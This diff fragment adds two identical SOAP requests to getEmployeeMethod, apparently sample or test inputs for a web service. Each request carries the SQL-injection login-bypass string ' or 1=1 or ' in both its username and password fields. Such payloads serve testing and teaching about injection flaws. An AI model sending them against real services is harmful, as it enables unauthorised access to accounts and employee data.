@@ -206,3 +206,21 @@
 </S:Body>
 </S:Envelope>
 
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' or 1=1 or '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' or 1=1 or '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
+<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
+<S:Body>
+<ns2:getEmployeeMethod xmlns:ns2="http://serviceExample.com">
+<ns2:EmpUsernameInputParam>' or 1=1 or '</ns2:EmpUsernameInputParam>
+<ns2:EmpPasswordInputParam>' or 1=1 or '</ns2:EmpPasswordInputParam>
+</ns2:getEmployeeMethod>
+</S:Body>
+</S:Envelope>
+
